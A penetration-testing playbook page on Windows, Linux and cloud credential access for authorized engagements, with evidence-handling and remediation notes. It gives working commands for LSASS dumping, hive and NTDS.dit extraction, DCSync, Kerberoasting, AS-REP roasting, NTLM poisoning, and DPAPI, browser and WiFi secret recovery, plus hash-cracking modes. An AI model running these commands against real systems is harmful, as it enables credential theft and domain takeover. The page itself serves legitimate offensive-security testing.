# Credential Access

Authorized engagements. MITRE: https://attack.mitre.org/tactics/TA0006/.

Treat credentials captured during an op as evidence — encrypted at rest, purged after reporting, never reused for anything except documenting the finding.

## Windows local credential stores

| Store | Contents | Access requirement |
|-------|----------|--------------------|
| LSASS memory | Logon session creds (NT hashes, Kerberos tickets, sometimes plaintext via WDigest) | SeDebugPrivilege (admin) |
| SAM hive | Local account NT hashes | SYSTEM (or offline copy) |
| SECURITY hive | LSA secrets, cached domain creds (DCC2) | SYSTEM |
| SYSTEM hive | Bootkey for SAM/SECURITY decrypt | SYSTEM |
| NTDS.dit (DC only) | All domain hashes | SYSTEM on DC or DRSUAPI via DCSync |
| DPAPI masterkeys | Decrypt Chrome/Edge/WiFi/RDP creds | User password OR domain backup key |

## LSASS — safer alternatives to mimikatz

Full mimikatz against LSASS is the textbook example of an EDR-flagged action. Alternatives for engagements where noise is monitored:

- Dump LSASS memory offline, analyse on operator box. Any of:
  - `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\x.dmp full` — built-in, flagged but signed.
  - Task Manager → right-click lsass → "Create dump file" (GUI).
  - Sysinternals ProcDump signed: `procdump.exe -ma lsass.exe lsass.dmp` — often AMSI-blocked by EDR.
  - nanodump (handle duplication, fileless) — https://github.com/fortra/nanodump
- Parse offline with `pypykatz lsa minidump lsass.dmp` — https://github.com/skelsec/pypykatz — no Windows needed.
- Against a live system without touching LSASS: steal TGTs via `Rubeus dump` (token) or `Rubeus triage` — https://github.com/GhostPack/Rubeus.

EDR-evading techniques (silent LSASS access via handle leak, PPL bypass, etc.) are heavily signatured; for engagements document the attempt, don't chase zero-cost bypass.

## SAM / SECURITY / SYSTEM (offline)

Obtain:

```
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY sec.save
reg save HKLM\SYSTEM sys.save
```

Parse:

```
impacket-secretsdump -sam sam.save -security sec.save -system sys.save LOCAL
```

Yields: local NT hashes, LSA secrets (service account plaintexts stored as `_SC_*`), cached domain logons (`$DCC2$#user#hash` — crack with hashcat `-m 2100`).

VSS fallback when running as admin live:

```
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

## NTDS.dit — domain hashes

From any DC, as admin:

```
ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

Outputs hashes in `user:rid:lm:nt:::` format; crack with hashcat `-m 1000`.

## DCSync

Any account with Replicating Directory Changes / ...-All rights can pull any hash from a DC without touching it. Default: Domain Admins, Enterprise Admins, Administrators, plus anyone granted via ACL (common misconfiguration — see `ad-attacks.md`).

```
impacket-secretsdump DOMAIN/user:'pass'@dc01.domain.tld -just-dc-user krbtgt
impacket-secretsdump DOMAIN/user:'pass'@dc01.domain.tld -just-dc
```

Mimikatz equivalent: `lsadump::dcsync /user:DOMAIN\krbtgt`.

Detection: 4662 on DC with properties `1131f6aa-...` and `1131f6ad-...` (the DS-Replication-Get-Changes GUIDs). Sigma rule `win_dcsync.yml`.

## Kerberoasting

Request TGS for any service account (user with SPN); crack offline.

```
impacket-GetUserSPNs -request -dc-ip 10.0.0.1 DOMAIN/user:'pass' -outputfile kerb.txt
hashcat -m 13100 kerb.txt wordlist.txt -r rules/OneRuleToRuleThemAll.rule
```

Rubeus from a Windows host: `Rubeus.exe kerberoast /nowrap`.

Reference: Sean Metcalf — https://adsecurity.org/?p=2293.

Opsec: `GetUserSPNs -request` with `-usersfile` limited to known service accounts avoids TGS-REP flood.

## AS-REP roasting

Accounts with "Do not require Kerberos pre-authentication" set return AS-REP data encrypted with their password hash — no auth needed.

```
impacket-GetNPUsers -dc-ip 10.0.0.1 -usersfile users.txt -format hashcat -outputfile asrep.txt DOMAIN/
hashcat -m 18200 asrep.txt wordlist.txt
```

Rare on modern tenants but worth checking.

## Responder / NTLM capture

See also `lateral-movement.md`.

```
sudo responder -I eth0 -wvdP
# capture NetNTLMv2 from LLMNR/NBNS/mDNS/WPAD poisoning
hashcat -m 5600 captured.txt wordlist.txt
```

If SMB signing is not enforced, relay instead of crack (`ntlmrelayx`).

## LSA Secrets

From `secretsdump` output under `[*] Dumping LSA Secrets`:

- `$MACHINE.ACC` — machine account hash, enables DCSync from a workstation
- `DPAPI_SYSTEM` — decrypts system DPAPI blobs (service creds)
- `NL$KM` — cached-credential key
- Plaintext service account passwords often appear as `_SC_<service>`

## DPAPI

User DPAPI masterkeys at `%APPDATA%\Microsoft\Protect\<SID>\`. Decrypt with:

- User password (`mimikatz dpapi::masterkey /in:<file> /password:'...'`)
- DPAPI domain backup key from DC (`lsadump::backupkeys /system:dc01`) — decrypts any user's masterkey

Common secrets it protects: Chrome/Edge cookies + saved passwords, Credential Manager, RDP saved creds, WiFi PSKs.

Tool: SharpDPAPI — https://github.com/GhostPack/SharpDPAPI — `SharpDPAPI.exe triage`.

## Browser credentials

- Chrome/Edge (Chromium) — SQLite DB `Login Data`, cookies `Network\Cookies`; values encrypted with DPAPI-wrapped key in `Local State`. Tools: SharpChromium (https://github.com/djhohnstein/SharpChromium), HackBrowserData (https://github.com/moonD4rk/HackBrowserData).
- Firefox — `key4.db` + `logins.json`; decrypt with `firefox_decrypt` https://github.com/unode/firefox_decrypt.

## WiFi

```
netsh wlan show profile
netsh wlan show profile name="SSID" key=clear
```

Shows PSK in clear if user has rights.

## Linux credential access

- `/etc/shadow` — `john`/`hashcat -m 1800 (sha512crypt)` or -m 7400 (sha256)
- `~/.*_history` — API keys, passwords pasted
- App configs (see priv-esc-linux.md credential harvesting)
- `gcore <pid>` of an SSH client / sudo process — strings may reveal plaintext (rare)
- LaZagne (Linux + Windows + macOS) — https://github.com/AlessandroZ/LaZagne — aggregates password stores. AV-flagged.

## Cloud creds (on-disk)

- `~/.aws/credentials`, `~/.aws/config`
- `~/.azure/accessTokens.json`, `~/.azure/azureProfile.json` (older; newer uses msal_token_cache.json)
- `~/.config/gcloud/credentials.db`, `access_tokens.db`, `application_default_credentials.json`
- `~/.kube/config` — kube contexts, often with embedded tokens
- `~/.docker/config.json` — base64 registry creds

Treat every one as a handoff vector into cloud-attacks.md.

## Cracking

- hashcat — https://hashcat.net/hashcat/ — prefer over john for GPU speed.
- Rulesets: OneRuleToRuleThemAll https://github.com/NotSoSecure/password_cracking_rules, best64 (bundled).
- Wordlists: rockyou, SecLists https://github.com/danielmiessler/SecLists, PwdB https://github.com/berzerk0/Probable-Wordlists.

## Reporting

- Sanitise: redact actual passwords in reports, show hash/partial.
- Document the attack path, the AD object or local store involved, and the remediation (disable WDigest, enforce SMB signing, LAPS, tiering, gMSA, etc.).

## References

- impacket secretsdump — https://github.com/fortra/impacket
- Mimikatz wiki — https://github.com/gentilkiwi/mimikatz/wiki
- GhostPack Rubeus / SharpDPAPI / SafetyKatz — https://github.com/GhostPack
- TheHacker.Recipes credentials — https://www.thehacker.recipes/ad/movement/credentials
- Microsoft protect LSASS (RunAsPPL) — https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection
